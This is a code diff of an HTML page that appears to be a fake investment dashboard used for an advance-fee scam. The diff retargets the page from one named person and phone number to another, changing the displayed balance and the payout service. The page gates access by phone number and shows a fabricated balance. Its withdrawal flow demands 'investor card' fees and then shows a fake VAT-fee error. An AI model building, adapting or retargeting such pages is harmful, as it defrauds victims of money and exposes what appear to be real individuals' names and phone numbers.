@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "772829704") {
+        if (code === "0757855584") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde:  1 450 000 FCFA</span>
+                <span class="balance">Solde:  4 640 000 FCFA</span>
                 <div class="account-info">
-                    <span id="user-name">Mamadou Ndour</span><br>
-                    <span id="user-phone">221 77 282 9704</span>
+                    <span id="user-name">Mamoya Noella</span><br>
+                    <span id="user-phone">225 07 57 85 55 84</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via Wave Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Mamadou Ndour";
-                const accountNumber = "221 77 282 9704";
-                const balance = "1 450 000 FCFA";
+                const accountName = "Mamoya Noella";
+                const accountNumber = "225 07 57 85 55 84";
+                const balance = "4 640 000 FCFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Wave Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Orange");
+                    setWithdrawalInfo("Wave");
                 }
             });
 
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Ndour, Veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher Mamoya, Veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
